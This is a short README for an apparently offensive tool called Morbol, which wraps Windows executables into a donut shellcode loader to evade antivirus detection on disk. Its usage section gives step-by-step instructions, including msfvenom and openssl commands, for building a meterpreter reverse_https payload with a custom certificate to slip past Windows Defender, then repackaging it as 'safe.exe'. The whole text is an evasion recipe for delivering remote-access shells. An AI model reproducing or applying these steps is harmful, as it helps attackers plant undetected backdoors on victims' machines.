# Morbol

Wraps PE Files (PIE required) into a shellcode loader via donut. This mainly evades detection on *disk*.

## Setup

```
go get golang.org/x/sys/windows
pip3 install donut-shellcode
sudo apt-get install upx
```

## Usage

In my experience the only reliable way to evade defender with meterpreter is to use a reverse_https payload with a custom cert.

- Modify `/etc/ssl/openssl.cnf` so that `CipherString = DEFAULT`
- openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
- set HandlerSSLCert on the server side listener

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=... LPORT=...  HandlerSSLCert=... -f exe  > msf.exe
python3 morbol.py msf.exe safe.exe
```


## Credit

Heavily based on:
* https://posts.specterops.io/going-4-a-run-eb263838b944
* https://github.com/D00MFist/Go4aRun
